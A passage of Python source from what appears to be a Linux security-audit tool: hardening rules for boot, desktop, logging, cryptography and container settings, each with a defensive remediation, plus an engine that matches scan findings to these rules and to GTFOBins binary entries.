        tags=["kernel", "mitigations", "vulnerability"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-010",
        title_patterns=["SELinux disabled in kernel boot parameters"],
        explanation="SELinux is deactivated at boot time.",
        security_impact="High - Disables all mandatory access controls, expanding compromise scope.",
        remediation="Enable SELinux in kernel cmdline settings.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["kernel", "selinux", "mac"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-011",
        title_patterns=["AppArmor disabled in kernel boot parameters"],
        explanation="AppArmor is deactivated at boot time.",
        security_impact="High - Disables AppArmor confinement rules.",
        remediation="Enable AppArmor in kernel cmdline settings.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["kernel", "apparmor", "mac"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-012",
        title_patterns=["Root shell spawned on systemd emergency/rescue mode without password"],
        explanation="Emergency shells are configured to bypass authentication.",
        security_impact="Critical - Local console connection can access root prompt directly without password.",
        remediation="Configure sulogin in emergency and rescue systemd files.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["systemd", "emergency", "vulnerability"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-013",
        title_patterns=["Boot files not owned by root"],
        explanation="Files under /boot are owned by non-root users.",
        security_impact="High - Allows non-root accounts to modify active boot images or configs.",
        remediation="Run 'chown -R root:root /boot'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["filesystem", "boot", "permissions"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-014",
        title_patterns=["World-writable files detected in /boot"],
        explanation="Files in /boot allow write access to anyone.",
        security_impact="Critical - Any unprivileged user can replace critical kernel or boot files.",
        remediation="Revoke write privileges for others: 'chmod o-w'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["filesystem", "boot", "vulnerability"],
        confidence_score=0.95,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-015",
        title_patterns=["Initramfs image permissions are too permissive"],
        explanation="Initramfs files have loose permissions (> 600).",
        security_impact="Medium - Unprivileged users can read/extract secrets contained in the initramfs.",
        remediation="Change permissions to 600: 'chmod 600 /boot/initrd*'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["filesystem", "initramfs", "permissions"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
]

# ------------------------------------------------------------------
#  GUI Security rules
# ------------------------------------------------------------------

GUI_SECURITY_RULES = [
    KnowledgeRule(
        rule_id="GUI-001",
        title_patterns=["GDM automatic login enabled in"],
        explanation="The GDM display manager automatically logs in a configured user session.",
        security_impact="High - Anyone with physical access can gain system access under that user without authentication.",
        remediation="Set AutomaticLoginEnable=false in GDM custom.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["gui", "gdm", "autologin"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-002",
        title_patterns=["LightDM automatic login enabled in"],
        explanation="LightDM is configured to log in a user session automatically without credentials.",
        security_impact="High - Bypasses credential requirements for local console access.",
        remediation="Remove autologin-user directives from /etc/lightdm/lightdm.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["gui", "lightdm", "autologin"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-003",
        title_patterns=["LightDM guest session enabled in"],
        explanation="Unauthenticated guest sessions are permitted by LightDM.",
        security_impact="Medium - Untrusted users can start temporary graphical sessions on local hardware.",
        remediation="Set allow-guest=false in lightdm.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["gui", "lightdm", "guest"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-004",
        title_patterns=["SDDM automatic login configured in"],
        explanation="SDDM display manager automatically initiates a user login session.",
        security_impact="High - Local access bypasses authentication.",
        remediation="Remove the User= configuration from [Autologin] section in sddm.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["gui", "sddm", "autologin"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-005",
        title_patterns=["Legacy X11 windowing system active"],
        explanation="The host graphical session runs X11 protocol instead of Wayland.",
        security_impact="Medium - X11 lacks graphical security boundaries, allowing local applications to keylog or capture clipboards of other programs.",
        remediation="Configure the display manager or user session to boot using Wayland.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["gui", "x11", "window-server"],
        confidence_score=0.85,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-006",
        title_patterns=["Active VNC server session detected"],
        explanation="VNC server is active on the system.",
        security_impact="Medium - Plaintext graphical screen and input transmission over networks.",
        remediation="Disable VNC or enforce SSH tunneling for VNC traffic.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["remote-desktop", "vnc", "vulnerability"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-007",
        title_patterns=["Insecure security layer configured in xrdp"],
        explanation="xrdp is configured to use legacy RDP security instead of TLS.",
        security_impact="High - Vulnerable to active network eavesdropping and MITM manipulation.",
        remediation="Configure security_layer=tls in /etc/xrdp/xrdp.ini.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["remote-desktop", "rdp", "xrdp"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-008",
        title_patterns=["Weak encryption level configured in xrdp"],
        explanation="xrdp crypt_level is configured to low or none.",
        security_impact="High - Inadequate confidentiality of RDP sessions.",
        remediation="Configure crypt_level=high in /etc/xrdp/xrdp.ini.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["remote-desktop", "rdp", "xrdp"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-009",
        title_patterns=["Firefox security bypasses are allowed in policy"],
        explanation="Managed Firefox policy permits users to disable standard browser security controls.",
        security_impact="Medium - Expands host vulnerability to malicious downloads or site certificate spoofing.",
        remediation="Configure DisableSecurityBypasses=true in managed policies.json.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["browser", "firefox", "policies"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-010",
        title_patterns=["pkexec binary is not owned by root"],
        explanation="The pkexec utility is owned by a non-root user.",
        security_impact="Critical - Completely breaks privilege verification boundaries for local GUI tasks.",
        remediation="Run 'chown root /usr/bin/pkexec'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["polkit", "privilege-escalation", "vulnerability"],
        confidence_score=0.95,
        source_stages=["gui_security"],
    ),
    KnowledgeRule(
        rule_id="GUI-011",
        title_patterns=["Polkit rule allows passwordless privilege escalation in"],
        explanation="A Polkit rule overrides permission checking to grant YES without password authorization.",
        security_impact="High - Local unauthenticated users can perform restricted administrative operations.",
        remediation="Modify rule in rules.d to require authentication validation.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["polkit", "privilege-escalation", "misconfiguration"],
        confidence_score=0.9,
        source_stages=["gui_security"],
    ),
]

# ------------------------------------------------------------------
#  Monitoring Security rules
# ------------------------------------------------------------------

MONITORING_RULES = [
    KnowledgeRule(
        rule_id="MON-001",
        title_patterns=["auditd auditing daemon is not running"],
        explanation="The system audit daemon auditd is inactive.",
        security_impact="High - Prevents kernel auditing of system calls, process spawning, or files changes.",
        remediation="Enable and start auditd: 'systemctl enable --now auditd'.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["auditing", "auditd", "daemon"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-002",
        title_patterns=["Audit rules do not track process execution (execve)"],
        explanation="The audit rules configured on the host do not monitor the execve system call.",
        security_impact="Medium - Commands run by users or attackers cannot be tracked in audit logs.",
        remediation="Configure audit rules to log execve calls in /etc/audit/rules.d/audit.rules.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["auditing", "auditd", "rules"],
        confidence_score=0.85,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-003",
        title_patterns=["Systemd journald storage is not persistent"],
        explanation="journald storage is volatile or auto rather than persistent.",
        security_impact="Medium - Graphical and service logs are lost upon reboot, disrupting incident response forensics.",
        remediation="Configure Storage=persistent in /etc/systemd/journald.conf.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["logging", "journald"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-004",
        title_patterns=["Syslog remote log forwarding is not configured"],
        explanation="Syslog does not forward log messages to a centralized SIEM or remote server.",
        security_impact="Medium - Attackers gaining administrative access can wipe local logs to hide indicators of compromise.",
        remediation="Add forwarding target (e.g. *.* @@siem-server:514) in /etc/rsyslog.conf.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["logging", "syslog", "forwarding"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-005",
        title_patterns=["Logrotate compression is disabled"],
        explanation="Global log rotation archives are not compressed.",
        security_impact="Low - Uncompressed logs increase disk consumption, exposing the host to denial of service from disk exhaustion.",
        remediation="Enable 'compress' in /etc/logrotate.conf.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["logging", "logrotate"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-006",
        title_patterns=["System time synchronization is inactive"],
        explanation="No active NTP/Chrony or systemd time synchronization is active.",
        security_impact="Medium - Clock drift breaks cryptographical tokens and renders event correlation across logs impossible.",
        remediation="Start and enable timesyncd or Chrony: 'systemctl enable --now systemd-timesyncd'.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["time", "ntp", "chrony"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-007",
        title_patterns=["fail2ban brute-force protection is not running"],
        explanation="The fail2ban utility is disabled or inactive.",
        security_impact="Medium - Bypasses automated blocking/jail protections on repeated authentication failure events.",
        remediation="Start fail2ban service: 'systemctl enable --now fail2ban'.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["monitoring", "fail2ban"],
        confidence_score=0.9,
        source_stages=["monitoring_security"],
    ),
    KnowledgeRule(
        rule_id="MON-008",
        title_patterns=["No active Host Intrusion Detection System (HIDS) resolved"],
        explanation="No active OSSEC, Wazuh or Tripwire agents found running.",
        security_impact="Medium - Compromise indicators, host-based files modification, or anomalous activity are not reported centrally.",
        remediation="Install and enroll host to a HIDS agent.",
        cis_control="CIS Control 8: Audit Log Management",
        tags=["monitoring", "hids", "wazuh"],
        confidence_score=0.85,
        source_stages=["monitoring_security"],
    ),
]

# ------------------------------------------------------------------
#  Cryptographic rules
# ------------------------------------------------------------------

CRYPTO_RULES = [
    KnowledgeRule(
        rule_id="CRYPT-001",
        title_patterns=["SSL/TLS private keys have insecure permissions"],
        explanation="SSL/TLS private key files under /etc/ssl/private have loose file permissions.",
        security_impact="High - Local unprivileged users can read private key parameters to decrypt TLS sessions or impersonate the host.",
        remediation="Run 'chmod 600 /etc/ssl/private/*' or set ownership to root.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "tls", "permissions"],
        confidence_score=0.95,
        source_stages=["crypto_security"],
    ),
    KnowledgeRule(
        rule_id="CRYPT-002",
        title_patterns=["OpenSSL configured with legacy TLS/SSL protocol support"],
        explanation="System OpenSSL configuration permits deprecated TLS 1.0/1.1 or SSLv3 protocols.",
        security_impact="Medium - Exposes client/server sessions to cryptographic downgrade attacks (e.g. POODLE).",
        remediation="Configure 'MinProtocol = TLSv1.2' in /etc/ssl/openssl.cnf.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "tls", "openssl"],
        confidence_score=0.9,
        source_stages=["crypto_security"],
    ),
    KnowledgeRule(
        rule_id="CRYPT-003",
        title_patterns=["Insecure SSH Ciphers enabled"],
        explanation="The SSH daemon supports insecure/legacy ciphers (CBC, 3DES, or RC4).",
        security_impact="High - Enables active network session hijacking or man-in-the-middle decryption.",
        remediation="Restrict Ciphers in sshd_config to AEAD/CTR ciphers.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "ssh", "ciphers"],
        confidence_score=0.95,
        source_stages=["crypto_security"],
    ),
    KnowledgeRule(
        rule_id="CRYPT-004",
        title_patterns=["Insecure SSH MAC algorithms enabled"],
        explanation="The SSH daemon supports insecure hash message authentication codes (MD5 or SHA-1).",
        security_impact="Medium - Cryptographical integrity check hashing is weak and susceptible to collisions.",
        remediation="Configure secure MACs (hmac-sha2-256/512) in sshd_config.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "ssh", "macs"],
        confidence_score=0.95,
        source_stages=["crypto_security"],
    ),
    KnowledgeRule(
        rule_id="CRYPT-005",
        title_patterns=["Kernel FIPS mode is disabled"],
        explanation="System kernel cryptographic modules do not enforce FIPS-140 compliance.",
        security_impact="Info - The host does not mandate FIPS validation constraints on algorithms.",
        remediation="Enable FIPS mode in kernel boot parameters.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "kernel", "fips"],
        confidence_score=0.85,
        source_stages=["crypto_security"],
    ),
    KnowledgeRule(
        rule_id="CRYPT-006",
        title_patterns=["Low available kernel entropy:"],
        explanation="The available system random entropy pool count is critically low (< 1000).",
        security_impact="Medium - Cryptographic operations (key exchange, secret generation) can block or generate predictable keys.",
        remediation="Install haveged or enable hypervisor entropy forwarding.",
        cis_control="CIS Control 3: Data Protection",
        tags=["crypto", "entropy"],
        confidence_score=0.9,
        source_stages=["crypto_security"],
    ),
]

# ------------------------------------------------------------------
#  Container security rules
# ------------------------------------------------------------------

CONTAINER_RULES = [
    KnowledgeRule(
        rule_id="CONT-001",
        title_patterns=["Docker user namespace remapping is disabled"],
        explanation="Docker user namespace remapping is disabled in the daemon configuration.",
        security_impact="High - Running containers as root mapping directly to the host's root account, leaving the host vulnerable to privilege escalation via container escape.",
        remediation="Configure 'userns-remap' in /etc/docker/daemon.json.",
        cis_control="CIS Control 18: Penetration Testing",
        tags=["container", "docker", "namespaces"],
        confidence_score=0.9,
        source_stages=["container_security"],
    ),
    KnowledgeRule(
        rule_id="CONT-002",
        title_patterns=["Kubelet anonymous authentication is enabled"],
        explanation="Kubelet anonymous authentication is enabled in the configuration options.",
        security_impact="High - Unauthenticated network clients can inspect node info or pod configurations via Kubelet APIs.",
        remediation="Set 'anonymous: { enabled: false }' in Kubelet's config.yaml.",
        cis_control="CIS Control 18: Penetration Testing",
        tags=["container", "kubernetes", "kubelet"],
        confidence_score=0.9,
        source_stages=["container_security"],
    ),
    KnowledgeRule(
        rule_id="CONT-003",
        title_patterns=["No active Linux Security Module (LSM) resolved"],
        explanation="Neither AppArmor nor SELinux is active on this host.",
        security_impact="High - Containers have no Linux Security Module profiles protecting the kernel boundaries, enabling easy escapes.",
        remediation="Enable AppArmor or SELinux in system bootloader configurations.",
        cis_control="CIS Control 18: Penetration Testing",
        tags=["container", "lsm", "apparmor", "selinux"],
        confidence_score=0.9,
        source_stages=["container_security"],
    ),
    KnowledgeRule(
        rule_id="CONT-004",
        title_patterns=["Kernel lacks seccomp system call filtering support"],
        explanation="Seccomp filtering is not active or supported in this kernel config.",
        security_impact="Medium - Container runtimes cannot filter kernel system calls, allowing runtimes to execute dangerous system APIs.",
        remediation="Recompile kernel with CONFIG_SECCOMP enabled.",
        cis_control="CIS Control 18: Penetration Testing",
        tags=["container", "seccomp"],
        confidence_score=0.85,
        source_stages=["container_security"],
    ),
    KnowledgeRule(
        rule_id="CONT-005",
        title_patterns=["Virtualization hypervisor modules active:"],
        explanation="Virtualization host kernel drivers (KVM/VirtualBox) are active on the host.",
        security_impact="Info - Active hypervisors require security isolation and regular security patch cycles.",
        remediation="Audit active virtual machines and remove unused virtualization modules.",
        cis_control="CIS Control 18: Penetration Testing",
        tags=["virtualization", "hypervisor"],
        confidence_score=0.9,
        source_stages=["container_security"],
    ),
]

ALL_RULES: list[KnowledgeRule] = (
    PRIVILEGE_ESCALATION_RULES
    + CAPABILITY_RULES
    + SSH_RULES
    + DOCKER_RULES
    + KERNEL_RULES
    + KERNEL_HARDENING_RULES
    + WRITABLE_RULES
    + SECRETS_RULES
    + AUTH_RULES
    + AUTH_SECURITY_RULES
    + PROCESS_RULES
    + PACKAGE_RULES
    + SERVICE_RULES
    + CRON_RULES
    + SUSPICIOUS_BINARY_RULES
    + FILESYSTEM_RULES
    + NETWORK_SECURITY_RULES
    + BOOT_SECURITY_RULES
    + GUI_SECURITY_RULES
    + MONITORING_RULES
    + CRYPTO_RULES
    + CONTAINER_RULES
)


# =========================================================================
#  Enriched Finding
# =========================================================================


@dataclass
class EnrichedFinding:
    """A Finding extended with knowledge-base enrichment data.

    All original ``Finding`` attributes are accessible via attribute
    delegation (``__getattr__``), so this class can be used anywhere
    a ``Finding`` is expected.
    """

    finding: Finding
    explanation: str = ""
    security_impact: str = ""
    remediation: str = ""
    enriched_references: list[str] = field(default_factory=list)
    cis_control: str = ""
    mitre_attack: list[str] = field(default_factory=list)
    cwe: str = ""
    enriched_tags: list[str] = field(default_factory=list)
    gtfo_bins: list[dict[str, str]] = field(default_factory=list)
    cve_references: list[str] = field(default_factory=list)
    confidence_score: float = 0.0

    def __getattr__(self, name: str) -> Any:
        return getattr(self.finding, name)

    def to_dict(self) -> dict[str, Any]:
        result = self.finding.to_dict()
        result.update(
            {
                "explanation": self.explanation,
                "security_impact": self.security_impact,
                "remediation": self.remediation,
                "enriched_references": self.enriched_references,
                "cis_control": self.cis_control,
                "mitre_attack": self.mitre_attack,
                "cwe": self.cwe,
                "enriched_tags": self.enriched_tags,
                "gtfo_bins": self.gtfo_bins,
                "cve_references": self.cve_references,
                "confidence_score": self.confidence_score,
            }
        )
        return result

    def has_enrichment(self) -> bool:
        """Return ``True`` if any enrichment data was applied."""
        return bool(
            self.explanation
            or self.security_impact
            or self.remediation
            or self.enriched_references
            or self.cis_control
            or self.mitre_attack
            or self.cwe
            or self.gtfo_bins
            or self.cve_references
        )


# =========================================================================
#  Enrichment Engine
# =========================================================================


class EnrichmentEngine:
    """Matches findings against the knowledge base and produces enriched findings.

    Usage::

        engine = EnrichmentEngine()
        enriched = engine.enrich_finding(finding)
        all_enriched = engine.enrich_all(findings)
    """

    def __init__(self, rules: list[KnowledgeRule] | None = None) -> None:
        self._rules = ALL_RULES if rules is None else rules

    def enrich_finding(self, finding: Finding) -> EnrichedFinding:
        """Apply enrichment to a single finding.

        Matches the finding against knowledge rules by title substring
        and source_stage/category filters. Also checks evidence for
        GTFOBins binary paths.
        """
        enriched = EnrichedFinding(finding=finding)
        matched_rules = [rule for rule in self._rules if self._rule_matches(rule, finding)]

        if not matched_rules:
            return enriched

        self._merge_rule_enrichment(enriched, matched_rules)
        self._apply_gtfobins_fields(enriched, finding)

        return enriched

    def _merge_rule_enrichment(
        self,
        enriched: EnrichedFinding,
        matched_rules: list[KnowledgeRule],
    ) -> None:
        for rule in matched_rules:
            self._apply_evidence_and_explanation(enriched, rule)
            self._apply_remediation_info(enriched, rule)
            self._apply_tags(enriched, rule)
            self._apply_confidence_adjustment(enriched, rule)

    @staticmethod
    def _apply_evidence_and_explanation(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if not enriched.explanation and rule.explanation:
            enriched.explanation = rule.explanation
        if not enriched.security_impact and rule.security_impact:
            enriched.security_impact = rule.security_impact
        if rule.references:
            enriched.enriched_references = list(set(enriched.enriched_references + rule.references))

    @staticmethod
    def _apply_remediation_info(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if not enriched.remediation and rule.remediation:
            enriched.remediation = rule.remediation
        if not enriched.cis_control and rule.cis_control:
            enriched.cis_control = rule.cis_control
        if rule.mitre_attack:
            enriched.mitre_attack = list(set(enriched.mitre_attack + rule.mitre_attack))
        if not enriched.cwe and rule.cwe:
            enriched.cwe = rule.cwe

    @staticmethod
    def _apply_tags(enriched: EnrichedFinding, rule: KnowledgeRule) -> None:
        if rule.tags:
            enriched.enriched_tags = list(set(enriched.enriched_tags + rule.tags))

    @staticmethod
    def _apply_confidence_adjustment(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if rule.confidence_score > enriched.confidence_score:
            enriched.confidence_score = rule.confidence_score

    def _apply_gtfobins_fields(
        self,
        enriched: EnrichedFinding,
        finding: Finding,
    ) -> None:
        gtfo_matches = self._check_gtfobins(finding)
        enriched.gtfo_bins = gtfo_matches
        if not gtfo_matches:
            return
        rule = SUSPICIOUS_BINARY_RULES[0]
        if not enriched.explanation:
            enriched.explanation = rule.explanation
        if not enriched.security_impact:
            enriched.security_impact = rule.security_impact
        if not enriched.remediation:
            enriched.remediation = rule.remediation
        if not enriched.cis_control:
            enriched.cis_control = rule.cis_control
        if not enriched.mitre_attack:
            enriched.mitre_attack = list(rule.mitre_attack)
        if not enriched.cwe:
            enriched.cwe = rule.cwe
        if enriched.confidence_score < rule.confidence_score:
            enriched.confidence_score = rule.confidence_score

    def enrich_all(self, findings: list[Finding]) -> list[EnrichedFinding]:
        """Apply enrichment to every finding in the list."""
        return [self.enrich_finding(f) for f in findings]

    def _rule_matches(self, rule: KnowledgeRule, finding: Finding) -> bool:
        """Check if a rule matches a finding."""
        # Check source_stage filter
        if rule.source_stages and finding.source_stage.lower() not in [s.lower() for s in rule.source_stages]:
            return False

        # Check source_category filter
        if rule.source_categories and finding.category.lower() not in [c.lower() for c in rule.source_categories]:
            return False

        # Check title patterns
        title_lower = finding.title.lower()
        return any(pattern.lower() in title_lower for pattern in rule.title_patterns)

    @staticmethod
    def _check_gtfobins(finding: Finding) -> list[dict[str, str]]:
        """Check finding title and evidence for GTFOBins binary paths."""
        results: list[dict[str, str]] = []
        seen_binaries: set[str] = set()
        text = f"{finding.title} {finding.evidence} {finding.description}"

        for full_path in re.findall(r"/[\w/.-]+", text):
            binary_part = full_path.split("/")[-1].lower()
            if binary_part in GTFOBINS_BINARIES and binary_part not in seen_binaries:
                seen_binaries.add(binary_part)
                entry = dict(GTFOBINS_BINARIES[binary_part])
                entry["binary"] = binary_part
                results.append(entry)

        return results


# =========================================================================
#  Convenience helpers
# =========================================================================

_default_engine = EnrichmentEngine()


def enrich_finding(finding: Finding) -> EnrichedFinding:
    """Enrich a single finding using the default engine."""
    return _default_engine.enrich_finding(finding)


def enrich_all(findings: list[Finding]) -> list[EnrichedFinding]:
    """Enrich all findings using the default engine."""
    return _default_engine.enrich_all(findings)


__all__ = [
    "ALL_RULES",
    "GTFOBINS_BINARIES",
    "CisControl",
    "EnrichedFinding",
    "EnrichmentEngine",
    "KnowledgeRule",
    "MitreTechnique",
    "enrich_all",
    "enrich_finding",
]
